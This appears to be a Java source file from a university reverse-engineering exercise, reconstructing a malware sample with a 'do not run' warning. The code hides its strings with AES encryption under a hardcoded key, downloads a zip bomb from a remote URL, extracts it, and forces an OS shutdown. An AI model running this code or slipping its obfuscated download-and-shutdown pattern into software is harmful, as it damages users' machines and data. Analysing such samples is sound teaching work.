package lab5.ex2;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Lab 5 / Exercise 2 — Reverse Engineering: Malware Analysis Sample
 *
 * !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 * WARNING — DO NOT RUN THIS CLASS.
 * This code was provided as a compiled .class file for a university
 * reverse-engineering exercise. It is a piece of malware that:
 *   1. Downloads a zip bomb (zbsm.zip) from bamsoftware.com
 *   2. Extracts it to the current working directory
 *   3. Immediately shuts down the OS ("shutdown /s" on Windows,
 *      "shutdown -h now" on Linux/macOS)
 * All dangerous strings are AES-encrypted in the original bytecode to
 * hinder static analysis. See DecryptAES.java for the decryption utility.
 * See sprawozdanie.txt for the full written analysis.
 * !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 */
public class Run {

    private static final String KEY = "Kjf456UjOP14Ywte";

    private static byte[] hexToBytes(String hex) {
        ByteArrayOutputStream out = new ByteArrayOutputStream(hex.length() / 2);
        for (int i = 0; i < hex.length(); i += 2) {
            out.write(Integer.parseInt(hex.substring(i, i + 2), 16));
        }
        return out.toByteArray();
    }

    private static String decrypt(String encryptedHex) throws Exception {
        byte[] src = hexToBytes(encryptedHex);
        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
        SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(StandardCharsets.UTF_8), "AES");
        IvParameterSpec iv = new IvParameterSpec(KEY.getBytes(StandardCharsets.UTF_8));
        cipher.init(Cipher.DECRYPT_MODE, keySpec, iv);
        return new String(cipher.doFinal(src));
    }

    private static void downloadFileFromURL(String address) throws Exception {
        URL url = new URL(address);
        Path workingDir = Paths.get(System.getProperty(
                decrypt("cf342300e78f3c21383678d00b71b225369f62782816ebd5986ae029b97f34f53fb78d0a05ece71c779ebbc83692cfe8919282626c7be128cfb6b8f285848ff5").trim())); // "user.dir"
        Path filePath = Paths.get(workingDir.toString(),
                decrypt("b92741a781f245538d5c75ab25330b9107832a09ef2c1d461a67507930557538e1fa2c3d572d2a384e4f9d399ef8c33d09467b3ab0454b41bab9350ce3774fdf").trim()); // "zbsm.zip"
        try (BufferedInputStream in = new BufferedInputStream(url.openStream());
             FileOutputStream fos = new FileOutputStream(filePath.toString())) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = in.read(buffer, 0, 1024)) != -1) {
                fos.write(buffer, 0, bytesRead);
            }
        } catch (IOException ignored) {
        }
        extractFilesFromZip(filePath, workingDir);
    }

    private static void extractFilesFromZip(Path filePath, Path destination) {
        try {
            if (!filePath.toFile().exists()) return;
            byte[] buffer = new byte[1024];
            try (ZipInputStream zis = new ZipInputStream(new FileInputStream(filePath.toString()))) {
                for (ZipEntry entry = zis.getNextEntry(); entry != null; entry = zis.getNextEntry()) {
                    try (FileOutputStream fos = new FileOutputStream(
                            Paths.get(destination.toString(), entry.getName()).toString())) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) fos.write(buffer, 0, len);
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

    /** DO NOT CALL — see class-level warning. */
    public static void main(String[] args) throws Exception {
        String os      = System.getProperty(decrypt("6474658359276b25720ff106097a2663f7d139752e9f95100ac045385fd51ee58f6a4a2c6d7f2701fed0ab2fff3a66bf43f78e79af22740fe718824cff7cda98").trim()); // "os.name"
        String windows = decrypt("054f1f395c9506dea62a842dd0a91602ef625bd2909bb87a2fbcab5a499e06013166de8c18bf9d982184785f07f59739c463c3d56327be198fcae6648f7314f4").trim(); // "Windows"
        downloadFileFromURL(decrypt("52ab37cab57dab5d50c38b06a37f12da4a093eadfd96502c3eef188a2c44e63a0cb4a60c16e3f41f0c02df264f492cf311030bd9be4a3f37db38755eef4527b9")); // zip bomb URL
        if (os.contains(windows)) {
            Runtime.getRuntime().exec(decrypt("2d830932f271350897857710196ec96453f8d261bc7f07181da0c2a10fbe2db2267c3526d61c01c1c28a004367774f64b687c76dcf6873995954a8d93f3d2f3c").trim()); // "shutdown /s"
        } else {
            Runtime.getRuntime().exec(decrypt("5673123e986e4c8ad4efa677a6d00b31b2007673a282e5ebc6a2738c0f603f36b372a9f85b2f598f3f76c5d43eb82e4183a123eea4031fcbb040c872e681e31f").trim()); // "shutdown -h now"
        }
    }
}
